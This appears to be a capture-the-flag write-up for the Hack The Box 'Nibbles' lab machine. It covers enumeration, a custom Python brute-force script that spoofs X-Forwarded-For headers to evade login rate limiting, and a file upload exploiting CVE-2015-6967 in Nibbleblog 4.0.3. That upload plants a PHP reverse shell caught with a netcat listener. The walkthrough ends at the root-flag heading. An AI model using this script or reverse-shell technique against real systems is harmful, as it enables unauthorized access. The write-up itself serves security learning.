## Default Information
IP Address: 10.10.10.75\
OS: Linux

## Enumeration

First, let's add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.75    nibbles.htb
```

Next, we will scan for open ports using masscan. Form the output, we realize that there are numerous open ports on this machine.

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.75 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-02 01:05:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.75                                     
Discovered open port 80/tcp on 10.10.10.75  
```

Now, we will scan these open ports using Nmap to identify the service behind each of these open ports.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.18 ((Ubuntu)) | Open |

Lastly, we will do use Nmap to scan for vulnerabilities on the open ports. From the output, port 80 may be vulnerable to a slow loris attack but slow loris is a DOS attack which may not be very helpful here.

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
```
## Discovery

First, we will try to find the endpoints and Vhosts of http://nibbles.htb with Gobuster. However, we were not able to find anything meaninful from the output

Visiting the website, we are presented with an empty page with the words _Hello World!_. However, upon inspecting the source code of the page, we realize that it contains a comment that points to the ```/nibbleblog``` endpoint.

![Nibbleblog directory](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nibbles/nibbleblog.PNG)

Visiting http;//nibbles.htb/nibbleblog, we realize that this webpage is using PHP. We will then enumerate furthur endpoints using Gobuster.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://nibbles.htb/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50 -x php -z --timeout 20s 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nibbles.htb/nibbleblog/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Expanded:                true
[+] Timeout:                 20s
===============================================================
2021/10/02 06:00:28 Starting gobuster in directory enumeration mode
===============================================================
http://nibbles.htb/nibbleblog/sitemap.php          (Status: 200) [Size: 401]
http://nibbles.htb/nibbleblog/content              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/content/]
http://nibbles.htb/nibbleblog/themes               (Status: 301) [Size: 322] [--> http://nibbles.htb/nibbleblog/themes/] 
http://nibbles.htb/nibbleblog/feed.php             (Status: 200) [Size: 300]                                             
http://nibbles.htb/nibbleblog/index.php            (Status: 200) [Size: 2986]                                            
http://nibbles.htb/nibbleblog/admin.php            (Status: 200) [Size: 1401]                                            
http://nibbles.htb/nibbleblog/admin                (Status: 301) [Size: 321] [--> http://nibbles.htb/nibbleblog/admin/]  
http://nibbles.htb/nibbleblog/plugins              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/plugins/]
http://nibbles.htb/nibbleblog/install.php          (Status: 200) [Size: 78]                                              
http://nibbles.htb/nibbleblog/update.php           (Status: 200) [Size: 1622]                                            
http://nibbles.htb/nibbleblog/README               (Status: 200) [Size: 4628]                                            
http://nibbles.htb/nibbleblog/languages            (Status: 301) [Size: 325] [--> http://nibbles.htb/nibbleblog/languages/]
```

Looking at http://nibbles.htb/README, we were able to determine that we are using a Nibbleblog 4.0.3 and the PHP that the website is using is v5.2 or higher. Upon some research, we realize that Nibbleblog is a CMS that operates based on PHP and uses XML to store its data. 

Next up, visitng http://nibbles.htb/nibbleblog/update.php, we are able to find another endpoint ```/content/private/config.xml```. Looking at that endpoint, we were able to extract the following pieces of information:
* IP Address: 10.10.10.134
* Possible username: admin

![config.xml file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nibbles/config_xml.PNG)

Together with the username, we will attempt to bruteforce the password to the SSH terminal using Hydra. Howeber, it seems that we are unable to bruteforce the login.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l admin -P rockyou.txt 10.10.10.75 -t 4 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-02 11:26:53
[DATA] max 4 tasks per 1 server, overall 4 tasks, 602043 login tries (l:1/p:602043), ~150511 tries per task
[DATA] attacking ssh://10.10.10.75:22/
[STATUS] 28.00 tries/min, 28 tries in 00:01h, 602015 to do in 358:21h, 4 active
```

Since the bruteforce to login to the SSH terminal failed, we will try to bruteforce a login to the admin panel on the webpage. However, there is a problem as we soon realize that if there is too many consecutive failed logins, our IP address will be blacklisted for a short period of time. 

```
sudo hydra -l admin -P rockyou.txt nibbles.htb http-post-form "/nibbleblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
```

However, we realize that we can add in a ```X-Forwarded-For``` header to bypass the rate-limiting protection mechanism. To bruteforce the login page, we will write our own script to find the password. From the output, we have obtained that the username-password pair is admin-nibbles.

```python
import random
import requests
import argparse
import time

def genRandIP():
	return '.'.join('%s'%random.randint(0, 255) for i in range(4))

def readPasswordList(passwordFileLocation):
	passwordList = []
	passwordFile = open(passwordFileLocation,'r')
	for x in passwordFile.readlines():
		passwordList.append(x.strip())
	passwordFile.close()
	return passwordList

def login(username, password, ip, url):
	headers = {'X-Forwarded-For': ip}
	payload = {'username': username, 'password': password}
	r = requests.post(
		url, headers=headers,data=payload
	)
	if r.status_code == 500:
		print(ip + "(" + password +"): "+ "Internal server error!")
		return False
	if "Incorrect username or password." in r.text:
		print(ip + "(" + password + "): "+ "Incorrect credentials!")
		return False
	if "blacklist" in r.text:
		print(ip + "(" + password + "):" + "Rate-limiting mechanism in place! Sleeping for 5mins....")
		time.sleep(300)
		return False
	else:
		print(ip + "(" + password + "): " + "Credentials found")
		return True

def run(passwordFileLocation,url,position):
	passwords = readPasswordList(passwordFileLocation)
	passwords = passwords[int(position):]
	username = "admin"
	for password in passwords:
		randomIP = genRandIP()
		testLogin = login(username,password,randomIP,url)
		if testLogin == True:
			print("Password is: " + str(password))
			return
		else:
			continue

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', help='url')
	parser.add_argument('-w', help='File location')
	parser.add_argument('-p', help='Position on password list')
	args = parser.parse_args()
	run(args.w, args.u, args.p)
```

Researching on nibbleblog, we realize that nibblieblog 4.0.3 is vulnerable to CVE-2015-6967. THis allows any authenticated user to upload arbitary files and spawn a reverse shell. However, the exploit on exploitdb [here](https://www.exploit-db.com/exploits/38489) only uses matasploit. Using the tutorial from [here](https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/), we will try to craft our own payload.

But first, we have to make sure that our image plugin is activated.

![Image plugins](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nibbles/plugins.PNG)

Next, let's try to upload a test file via http://nibbles.htb/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image. We noticed that even though the file upload displays a warning message, the file will still be successfull uploaded, and can be viewed via http://nibbles.htb/content/private/plugins/my_image.

![Uploaded files](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nibbles/uploaded_files.PNG)

## Obtaining user flag

Now, we will upload a php reverse shell, downloaded from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell) on the website and accessing the uploaded file will grant us a reverse shell. But, first let's stabilize the reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000           
listening on [any] 4000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.75] 44484
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 22:37:17 up 20:07,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/$ export TERM=xterm
export TERM=xterm
nibbler@Nibbles:/$ stty cols 132 rows 34
stty cols 132 rows 34
nibbler@Nibbles:/$
```

Now, all we have to do is to obtain the user flag.

```
nibbler@Nibbles:/home$ cd /home/nibbler
cd /home/nibbler
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
<Redacted user flag>
nibbler@Nibbles:/home/nibbler$ 
```
## Obtaining root flag
